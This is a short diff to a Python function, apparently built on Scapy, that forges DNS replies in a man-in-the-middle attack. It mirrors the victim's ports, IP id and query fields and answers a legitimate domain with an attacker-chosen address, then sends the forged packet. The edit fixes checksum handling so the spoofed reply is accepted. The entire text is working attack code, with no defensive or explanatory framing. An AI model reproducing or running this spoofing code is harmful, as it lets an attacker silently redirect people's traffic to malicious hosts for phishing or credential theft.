@@ -32,12 +32,13 @@ def MIMspoofDNS(pkt, goodSite, evilSite) :
     EvilDNSResponse[UDP].dport = pkt[UDP].sport
     EvilDNSResponse[UDP].sport = pkt[UDP].dport
     del EvilDNSResponse[UDP].chksum
-    EvilDNSResponse[UDP].show2(dump = True)
+    del EvilDNSResponse[IP].chksum
     EvilDNSResponse[DNS].rd = pkt[DNS].rd
     EvilDNSResponse[DNS].qd = pkt[DNS].qd
     EvilDNSResponse[DNS].qr = 1
     EvilDNSResponse[DNS].an = DNSRR(rrname = goodSite, rdata = evilSite)
     EvilDNSResponse[IP].id = pkt[IP].id
+    EvilDNSResponse.show2(dump = True)
     EvilDNSResponse.show()
     print(EvilDNSResponse[IP].id)
     send(EvilDNSResponse)
